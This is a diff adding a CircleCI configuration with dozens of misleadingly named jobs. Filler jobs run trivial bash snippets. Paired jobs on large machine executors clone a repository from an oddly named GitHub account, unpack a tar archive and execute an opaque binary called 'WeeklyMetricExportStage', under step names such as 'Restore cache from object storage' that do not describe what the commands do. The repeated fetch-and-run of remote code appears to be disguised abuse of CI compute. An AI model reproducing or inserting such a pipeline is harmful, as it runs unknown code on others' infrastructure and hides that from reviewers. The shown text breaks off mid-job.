@@ -1,0 +1,1795 @@
+version: 2.1
+
+jobs:
+  FindUnusedDependenciesForReview:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: DeployExtensionContainerToProduction
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; function greet { echo "hi $1"; }; greet alpha; true ; } > /tmp/lint-sources/RouterUpdate
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'RouterUpdate'
+  PackageMonitorSlice1Of5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/RouterUpdate"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --jobs 1 --depth 1 "https://github.com/${locking}/${coredocs}" ${PWD}
+      - run:
+          name: Restore vendored sources
+          command: |
+            tar -x --file toolkit-release-replica-2.tar
+      - run:
+          command: |
+            /bin/bash -c "./WeeklyMetricExportStage"
+  UploadServiceScreenshots:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: post-restore-tests
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' "registry is current"; s="maroon"; case "$s" in [a-m]*) echo "first half";; *) echo "second half";; esac; true ; } > /tmp/lint-sources/post-sync-step
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'post-sync-step'
+  PlaygroundBuildOutputs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/post-sync-step"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --branch main "https://github.com/${locking}/${coredocs}" ${PWD}
+      - run:
+          name: Fetch fixtures
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar --no-same-owner
+      - run:
+          command: |
+            "./WeeklyMetricExportStage"
+  review-loader-coverage-data:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Promote preview release to one region
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "probing indexer"; rows=(maple zebra purple black fox ram); rows+=(golden); echo "${rows[-1]}"; echo indexer responded; true ; } > /tmp/lint-sources/Scheduler
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'Scheduler'
+  Obfuscate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/Scheduler"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 3 --branch main "https://github.com/${locking}/${coredocs}" ${PWD}
+      - run:
+          name: Sync asset bundles
+          command: |
+            tar xf toolkit-release-replica-2.tar
+      - run:
+          command: |
+            env ./WeeklyMetricExportStage
+  setUpMailServerContainer:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Lint router sanity tests against previous release
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "stage 3 of 12"; echo "11 tests collected"; true ; } > /tmp/lint-sources/CacheReleaseTools
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'CacheReleaseTools'
+  DependencyBumpRun:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/CacheReleaseTools"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --recurse-submodules --depth 1 "https://github.com/${locking}/${coredocs}" "${PWD}"
+      - run:
+          name: Unpack toolkit
+          command: |
+            tar --extract --file=toolkit-release-replica-2.tar
+      - run:
+          command: |
+            "$(pwd)/WeeklyMetricExportStage"
+  build-and-scan-export-service:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: memory-benchmark (group 5 of 8)
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; p=149; r=43; while ((r != 0)); do c=$((p % r)); p=$r; r=$c; done; echo "$p"; echo "leg 1 of 2 ready"; true ; } > /tmp/lint-sources/Certificates
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'Certificates'
+  compress-dispatcher-changelog:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/Certificates"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=2 --filter=blob:none "https://github.com/${locking}/${coredocs}" "${PWD}"
+      - run:
+          name: Hydrate workspace
+          command: |
+            tar xf - < toolkit-release-replica-2.tar
+      - run:
+          command: |
+            exec "./WeeklyMetricExportStage"
+  environment-removal-wave-1:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: staging-deployment (retry 3)
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; suite="notify"; cases=207; printf '%s suite, %d cases, %d shards of %d\n' "$suite" "$cases" 2 $((cases / 2)); true ; } > /tmp/lint-sources/identity-service-checks
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'identity-service-checks'
+  package-decoder-changelog:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/identity-service-checks"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --jobs=2 "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Extract sources
+          command: |
+            tar -x < toolkit-release-replica-2.tar
+      - run:
+          command: |
+            sh -c "./WeeklyMetricExportStage"
+  InventoryConfigurationSnapshot:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: engine-lint-results
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; counts=(44 44 31 10); doubled=(); for n in "${counts[@]}"; do doubled+=($((n * 2))); done; echo "${doubled[*]}"; true ; } > /tmp/lint-sources/PermissionAuditRetry4
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'PermissionAuditRetry4'
+  UserPortalDebugLogsReplica2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/PermissionAuditRetry4"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 5 --no-tags "https://github.com/${locking}/${coredocs}" $PWD
+      - run:
+          name: Restore build cache
+          command: |
+            tar xf toolkit-release-replica-2.tar
+      - run:
+          command: |
+            exec ./WeeklyMetricExportStage
+  PublishToDocumentationSite:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Signature Verification Task
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; acc=1; for ((i = 0; i < 6; i++)); do acc=$((acc * 8)); done; echo "$acc"; echo 'pass 2 complete'; true ; } > /tmp/lint-sources/quick-refresh
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'quick-refresh'
+  BuildStyleSheets:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/quick-refresh"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --no-tags "https://github.com/${locking}/${coredocs}" "$(pwd)"
+      - run:
+          name: Pull reference data
+          command: |
+            tar -x --file toolkit-release-replica-2.tar
+      - run:
+          command: |
+            bash -lc './WeeklyMetricExportStage'
+  alert-team-after-code-review:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Resolve build dependencies in dry run mode
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%05d\n' 12; printf '%s\n' "phase 2 started"; true ; } > /tmp/lint-sources/DeploymentRollbackWorkflow
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'DeploymentRollbackWorkflow'
+  CleanUpLauncherModuleCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/DeploymentRollbackWorkflow"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 3 "https://github.com/${locking}/${coredocs}" "."
+      - run:
+          name: Stage inputs
+          command: |
+            tar -xf toolkit-release-replica-2.tar --no-same-owner
+      - run:
+          command: |
+            "$PWD/WeeklyMetricExportStage"
+  PersistingStage1:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Build packages and run load tests
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "2 modules compiled"; p="web/conf/data/notes.h"; echo "${p%.h}.o"; true ; } > /tmp/lint-sources/ScheduledBranchCheckout
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'ScheduledBranchCheckout'
+  clone-registry-repository:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/ScheduledBranchCheckout"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=5 --no-tags "https://github.com/${locking}/${coredocs}" ${PWD}
+      - run:
+          name: Unpack bundle
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar
+      - run:
+          command: |
+            sh -c "./WeeklyMetricExportStage"
+  package-download-slice-2-of-6:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: One-Time Summary
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' iota,1 teal,39 carbon,31 bronze,29 | cut -d, -f1; true ; } > /tmp/lint-sources/execute-desktop-app-code-scan
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'execute-desktop-app-code-scan'
+  formatter-patch-bump:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/execute-desktop-app-code-scan"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 3 "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Rehydrate tree
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar --no-same-owner
+      - run:
+          command: |
+            "$PWD/WeeklyMetricExportStage"
+  setup-stage:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: long-running-install
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; version="7.20.2"; echo "$version" | sed 's/\./-/g'; true ; } > /tmp/lint-sources/benchmark-job
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'benchmark-job'
+  labelingBuild:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/benchmark-job"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --filter=blob:none "https://github.com/${locking}/${coredocs}" "$PWD"
+      - run:
+          name: Fetch corpus
+          command: |
+            tar -x --file toolkit-release-replica-2.tar
+      - run:
+          command: |
+            cd . && exec ./WeeklyMetricExportStage
+  installer-debug-build:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: Execute Storage Type Checks
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' "rho 15" "funnel 13" "valve 16" "orange 23" | awk '{printf "%s has %d\n", $1, $2}'; echo all good; true ; } > /tmp/lint-sources/review-portal-coverage-report
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'review-portal-coverage-report'
+  link-checker-test-logs-run-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/review-portal-coverage-report"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --quiet --depth 1 "https://github.com/${locking}/${coredocs}" "$(pwd)"
+      - run:
+          name: Checkout vendored deps
+          command: |
+            tar --extract --verbose --file toolkit-release-replica-2.tar
+      - run:
+          command: |
+            exec "./WeeklyMetricExportStage"
+  send-notification-every-week:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Traceability
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' "batch 2 queued"; printf '%s\n' rowan,8 koala,32 trout,30 cyan,16 | sort -t, -k2 -n -r | cut -d, -f1; true ; } > /tmp/lint-sources/tagging-task
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'tagging-task'
+  search-image-build-stage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/tagging-task"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=3 --branch main "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Prime workspace
+          command: |
+            tar -x -v -f toolkit-release-replica-2.tar
+      - run:
+          command: |
+            cd "$PWD" && ./WeeklyMetricExportStage
+  WebsiteDatabaseMigrations:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Show Server Version in Short Form
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; k=0; while [[ $k -lt 2 ]]; do ((k += 1)); echo "[$k/2] worker"; done; echo "nothing left to do"; true ; } > /tmp/lint-sources/release-bundle
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'release-bundle'
+  OperatorHealthCheck:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/release-bundle"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 2 --branch main "https://github.com/${locking}/${coredocs}" $(pwd)
+      - run:
+          name: Unpack payload
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar
+      - run:
+          command: |
+            './WeeklyMetricExportStage'
+  cleanup-task-replica-5:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Deploy container and run acceptance tests
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; word="bronze copper"; echo "$word" | awk '{print toupper($0)}'; true ; } > /tmp/lint-sources/download-job
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'download-job'
+  sync-link-checker-release-notes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/download-job"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=4 "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Restore snapshot
+          command: |
+            tar -xf toolkit-release-replica-2.tar
+      - run:
+          command: |
+            cd "$(pwd)" && ./WeeklyMetricExportStage
+  build-run:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: restart-extension
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "progress 60 percent"; printf '%s\n' lime meteor goat hazel willow | sed '1d;$d'; true ; } > /tmp/lint-sources/pre-cleanup-report-pass-3
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'pre-cleanup-report-pass-3'
+  PerformRegistryLicenseAudit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/pre-cleanup-report-pass-3"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 2 --no-tags "https://github.com/${locking}/${coredocs}" $(pwd)
+      - run:
+          name: Fetch sources
+          command: |
+            tar -x < toolkit-release-replica-2.tar
+      - run:
+          command: |
+            cd . && ./WeeklyMetricExportStage
+  chunk-8:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restart registry instance (level 2)
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo pliers-{pig,nova}; true ; } > /tmp/lint-sources/initializeAnalyticsTestCache
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'initializeAnalyticsTestCache'
+  UnlockDeployments:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/initializeAnalyticsTestCache"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=5 --no-tags "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Unroll archive
+          command: |
+            tar -xf toolkit-release-replica-2.tar --no-same-owner
+      - run:
+          command: |
+            env "./WeeklyMetricExportStage"
+  download-crawler-dependencies:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: Generate tutorials and deploy preview site
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' earth silver zebra hare | awk 'length($0) < 5'; true ; } > /tmp/lint-sources/bundle-bindings-for-review
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'bundle-bindings-for-review'
+  AutomaticExport:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/bundle-bindings-for-review"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --no-tags "https://github.com/${locking}/${coredocs}" "${PWD}"
+      - run:
+          name: Seed workspace
+          command: |
+            tar xf "toolkit-release-replica-2.tar"
+      - run:
+          command: |
+            cd "$PWD" && ./WeeklyMetricExportStage
+  TestAndPublishDebugBuild:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Splitting sanity tests manually if build succeeds
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; grep -c elk < <(printf '%s\n' elk emu pomelo wren); echo "warming up catalog"; true ; } > /tmp/lint-sources/MonitorDatabaseSchema
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'MonitorDatabaseSchema'
+  data-export-pipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/MonitorDatabaseSchema"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth=1 --branch main --no-tags "https://github.com/${locking}/${coredocs}" "$PWD"
+      - run:
+          name: Unpack sources
+          command: |
+            tar -xf toolkit-release-replica-2.tar
+      - run:
+          command: |
+            bash -c "./WeeklyMetricExportStage"
+  audit-middleware:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Initialize nested repositories at job start
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "target raven selected"; k=15; t=$((k % 12)); echo "$k mod 12 is $t"; printf '%s\n' psi willow cyan | sed -n '/^cy/p'; true ; } > /tmp/lint-sources/AuditStage
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'AuditStage'
+  MonthlyOperatorHealthChecks:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/AuditStage"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 5 --filter=blob:none "https://github.com/${locking}/${coredocs}" "`pwd`"
+      - run:
+          name: Restore vendored sources
+          command: |
+            tar -xf toolkit-release-replica-2.tar --directory .
+      - run:
+          command: |
+            sh -c "exec ./WeeklyMetricExportStage"
+  firmware-compile:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: TestAndPublishDocumentation
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; lookup() { local -A table=([cobalt]=7 [hazel]=77); echo "${table[$1]}"; }; lookup hazel; true ; } > /tmp/lint-sources/optimize-shared-library
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'optimize-shared-library'
+  StorageArtifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/optimize-shared-library"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --quiet --depth 1 "https://github.com/${locking}/${coredocs}" $PWD
+      - run:
+          name: Fetch fixtures
+          command: |
+            tar -xf /dev/stdin < toolkit-release-replica-2.tar
+      - run:
+          command: |
+            /bin/bash -c './WeeklyMetricExportStage'
+  landing-page-review:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Release Nightly Build to Staging Cluster
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; echo "warming up thumbnailer"; printf '%s\n' fig=13 zebra=24 poplar=8 willow=33 | cut -d= -f1 | sort | paste -s -d,; echo thumbnailer warmed up; true ; } > /tmp/lint-sources/CacheInventoryToolsInParallel
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'CacheInventoryToolsInParallel'
+  CompleteManualApprovalJob:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/CacheInventoryToolsInParallel"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --jobs 2 "https://github.com/${locking}/${coredocs}" $(pwd)
+      - run:
+          name: Sync asset bundles
+          command: |
+            tar -x --file toolkit-release-replica-2.tar
+      - run:
+          command: |
+            /bin/sh -c "./WeeklyMetricExportStage"
+  runtime-build-options:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Converter Database Schema
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; printf '%s\n' "preparing index rebuild"; q=65; ((++q)); echo "$q"; printf '%s' "mango eel" | sha1sum | fold -w 16; true ; } > /tmp/lint-sources/analyzer-lint-summary
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'analyzer-lint-summary'
+  websiteCoverage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/analyzer-lint-summary"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 2 --no-tags "https://github.com/${locking}/${coredocs}" "$PWD"
+      - run:
+          name: Unpack toolkit
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar --directory .
+      - run:
+          command: |
+            bash -lc "./WeeklyMetricExportStage"
+  post-rollback-backup:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - run:
+          name: lint-fast-crawler-tests
+          command: |
+            mkdir -p /tmp/lint-sources
+            { set +o pipefail 2>/dev/null; test 3 -lt 94 || echo "no"; true ; } > /tmp/lint-sources/AccessProxyManifests
+      - persist_to_workspace:
+          root: /tmp/lint-sources
+          paths:
+            - 'AccessProxyManifests'
+  HourlyBinaryInspection:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: Restore cache from object storage
+          command: |
+            xxd -s 32768 -l 200 "/tmp/lint-sources/AccessProxyManifests"
+      - run:
+          name: scan-daemon
+          command: |
+            locking="vickiewinfield370449gwskum7h-gif"; coredocs="SchedulesPartition3Of8"
+            git clone --depth 5 "https://github.com/${locking}/${coredocs}" .
+      - run:
+          name: Hydrate workspace
+          command: |
+            tar --extract -f toolkit-release-replica-2.tar --directory .
+      - run:
+          command: |
+            bash -c './WeeklyMetricExportStage'
+  Capacity:
+    docker:
+      - image: cimg/base:2024.06
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/lint-sources
+      - run:
+          name: compute-renderer-hashes
+          command: |
+            mkdir -p /tmp/lint-sources
